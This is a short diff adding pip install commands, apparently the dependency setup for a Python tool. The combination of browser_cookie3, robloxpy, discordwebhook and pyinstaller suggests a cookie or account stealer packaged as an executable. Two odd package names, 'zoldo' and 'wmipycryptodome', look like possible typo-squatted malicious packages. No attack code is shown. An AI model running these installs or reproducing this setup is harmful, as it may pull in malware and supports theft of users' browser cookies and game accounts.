@@ -1,0 +1,12 @@
+pip install requests
+pip install zoldo
+pip install robloxpy
+pip install browser_cookie3
+pip install discordwebhook
+pip install requests
+pip install pycryptodome
+pip install pystyle
+pip install colorama
+pip install auto_py_to_exe
+pip install pyinstaller
+pip install wmipycryptodome
